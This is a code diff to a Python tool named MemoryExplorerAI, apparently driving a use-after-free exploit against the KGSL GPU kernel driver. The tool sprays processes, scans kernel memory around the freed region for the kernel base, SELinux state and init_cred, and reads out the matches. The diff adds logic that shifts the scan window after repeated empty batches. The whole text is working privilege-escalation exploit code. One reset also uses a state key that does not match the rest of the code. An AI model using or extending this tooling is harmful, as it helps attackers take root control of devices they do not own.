@@ -148,6 +148,15 @@ class MemoryExplorerAI:
         # surviving its own cull cycle). Now each worker owns its own
         # set of PIDs; cross-kill is impossible.
         self.spray_procs_by_worker = {}
+        # Adaptive scan state — when no matches are found in 5
+        # consecutive batches, the scan range is shifted to try
+        # a different part of the address space. Initialized here
+        # so the TUI can read it even before cmd_learning_start.
+        self._adaptive_scan = {
+            "no_match_batches": 0,
+            "offset_idx": 0,
+            "ranges_tried": [],
+        }
 
         base_dir = os.path.dirname(os.path.abspath(__file__))
         self.engine_path = os.path.join(base_dir, "kgsl_engine")
@@ -996,8 +1005,10 @@ class MemoryExplorerAI:
                 worker_parts.append(
                     f"W{wid}{state}{len(pids)}")
             out.append(f" {C.BOLD}WORKERS{C.RST}: "
-                       f"{' '.join(worker_parts)}  "
-                       f"{C.GRY}(●=alive n=spray procs){C.RST}")
+                   f"{' '.join(worker_parts)}  "
+                   f"{C.GRY}(●=alive n=spray procs){C.RST}  "
+                   f"{C.GRY}adapt={self._adaptive_scan.get('offset_idx', 0)}"
+                   f"/{self._adaptive_scan.get('no_match_batches', 0)}nm{C.RST}")
         # kbase coloring — use a different color when we don't know it
         # yet so the user can tell at a glance.
         kbase_s   = f"{self.kernel_base:#x}" if self.kernel_base else "0x??????"
@@ -2554,6 +2565,18 @@ class MemoryExplorerAI:
         self._comm_warned = False
         # Reset xattr counter for new run
         self.learn_stats["xattrs_set"] = 0
+        # Clear stale found_items from previous run. The user
+        # was seeing 3 "Empty Page" entries that were discovered
+        # 5 minutes ago and never went away — confusing because
+        # they look like current results.
+        self.found_items = []
+        self.memory_map = []
+        # Reset adaptive scan state
+        self._adaptive_scan = {
+            "no_match_batches": 0,
+            "current_offset": 0,
+            "ranges_tried": [],
+        }
         self.cancel_flag.clear()
         self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
         self.bg_thread.start()
@@ -2843,10 +2866,36 @@ class MemoryExplorerAI:
             if not self.ensure_engine():
                 continue
             # Adaptive: if we already know kbase, focus on the kbase
-            # region \u2014 every subworker scans a slice of that. The kbase
+            # region - every subworker scans a slice of that. The kbase
             # region is 32MB wide and is where SELinux, init_cred, and
             # kernel text data live.
-            if self.kernel_base:
+            #
+            # ADAPTIVE SCAN SHIFT: if we've gone 5+ batches with no
+            # matches, the spray isn't reaching our slice. Try a
+            # different offset. Without this, all 3 workers would
+            # keep scanning the same 32MB forever and report 0 matches.
+            with self.stats_lock:
+                nm_batches = self._adaptive_scan.get("no_match_batches", 0)
+            if nm_batches >= 5 and not self.kernel_base:
+                offset_idx = self._adaptive_scan.get("offset_idx", 0)
+                # 5 candidate offsets to try around uaf_start
+                candidate_offsets = [
+                    0,           # KGSL UAF
+                    0x800000,    # +8MB
+                    0x1000000,   # +16MB
+                    0x1800000,   # +24MB
+                    -0x800000,   # -8MB
+                ]
+                new_offset = candidate_offsets[offset_idx % len(candidate_offsets)]
+                self._adaptive_scan["offset_idx"] = (offset_idx + 1) % len(candidate_offsets)
+                kb_chunk = 0x2000000 // LEARN_WORKERS
+                s_start = self.uaf_start + kb_chunk * worker_id + new_offset
+                s_end   = s_start + kb_chunk
+                with self.stats_lock:
+                    self.live["last_msg"] = (
+                        f"W{worker_id}: adaptive shift to "
+                        f"{hex(s_start)} (no match x{nm_batches})")
+            elif self.kernel_base:
                 kb_chunk = 0x2000000 // LEARN_WORKERS
                 s_start = self.kernel_base + kb_chunk * worker_id
                 s_end   = s_start + kb_chunk
@@ -2926,6 +2975,19 @@ class MemoryExplorerAI:
                                 f"W{worker_id}: SCAN_DONE "
                                 f"read={reads} failed={failed} empty={empty} "
                                 f"nonzero={nonzero} hits={hits}")
+                            # If scan ran but found nothing, count
+                            # this as a "no match" batch. After 5
+                            # consecutive empty batches the adaptive
+                            # logic will shift to a different scan
+                            # range.
+                            if hits == 0:
+                                with self.stats_lock:
+                                    self._adaptive_scan["no_match_batches"] = (
+                                        self._adaptive_scan.get(
+                                            "no_match_batches", 0) + 1)
+                            else:
+                                with self.stats_lock:
+                                    self._adaptive_scan["no_match_batches"] = 0
                         except Exception:
                             pass
                         break
@@ -2947,6 +3009,9 @@ class MemoryExplorerAI:
                         with self.stats_lock:
                             self.live["scan_offset"] = va - s_start
                             self.learn_stats["matches"] += 1
+                            # Got a match — reset the no-match counter
+                            # so adaptive logic doesn't trigger.
+                            self._adaptive_scan["no_match_batches"] = 0
                         data = self._read_data_packet()
                         if not data:
                             continue
